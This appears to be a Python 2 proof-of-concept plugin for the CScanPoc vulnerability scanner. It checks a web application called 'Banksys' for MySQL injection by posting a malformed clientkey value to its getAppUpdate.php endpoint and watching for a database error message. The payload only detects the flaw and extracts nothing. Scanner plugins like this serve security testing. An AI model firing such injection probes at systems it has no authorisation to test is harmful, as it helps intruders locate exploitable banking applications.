# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Banksys_0101' # 平台漏洞编号
    name = '银行系统MySQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-06-19'  # 漏洞公布时间
    desc = '''模版漏洞描述
    银行系统MySQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=205215
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Banksys'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '21984069-8c53-4c52-a73a-1b9f2e117a2d' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-26' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/interFace/getAppUpdate.php"
            payload = '''clientkey" : "254'"'''
            headers = {
                "User-Agent": "eç¤¾åºåæ·é 1.0.8 (iPhone; iPhone OS 9.3.1; zh_CN)",
                "Content-Length": "25",
                "Connection": "close",
                "Accept-Encoding": "gzip"
            }
            _response = requests.post(url, data=payload, headers=headers)
            if "MySQL server error" in _response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
